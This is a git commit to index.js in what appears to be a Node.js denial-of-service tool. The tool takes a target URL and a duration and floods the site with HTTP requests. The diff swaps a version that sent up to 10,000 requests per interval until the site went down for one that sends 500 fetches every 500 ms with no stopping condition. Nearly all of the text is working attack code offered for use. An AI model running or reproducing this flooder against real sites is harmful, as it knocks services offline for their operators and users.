e004e3204ba808747b59448391f2e353849c75d9
Heru Dev <162998538+Heruteah@users.noreply.github.com>
2025-01-14 18:29:09 +0000

    Hello

--- index.js
+++ index.js
@@ -18,38 +18,16 @@ console.log(`
 
 const target = process.argv[2];
 const duration = process.argv[3];
-const requestsPerInterval = 10000;
-const totalRequests = 1000000;
+const requestsPerInterval = 500;
 
 if (process.argv.length < 4 || isNaN(parseInt(duration))) {
     console.log('Invalid Usage: node index.js <link target> <duration in seconds>');
     process.exit(1);
 } else {
-    let requestCount = 0;
-
     const attackInterval = setInterval(() => {
-        fetch(target)
-            .then(response => {
-                if (response.status !== 200) {
-                    console.log('Site is down, stopping attack.');
-                    clearInterval(attackInterval);
-                    process.exit(0);
-                }
-                for (let i = 0; i < requestsPerInterval; i++) {
-                    fetch(target).catch(error => {});
-                    requestCount++;
-                    if (requestCount >= totalRequests) {
-                        clearInterval(attackInterval);
-                        console.log('Completed 1 million requests.');
-                        process.exit(0);
-                    }
-                }
-            })
-            .catch(() => {
-                console.log('Site is down, stopping attack.');
-                clearInterval(attackInterval);
-                process.exit(0);
-            });
+        for (let i = 0; i < requestsPerInterval; i++) {
+            fetch(target).catch(error => {});
+        }
     }, 500);
 
     setTimeout(() => {
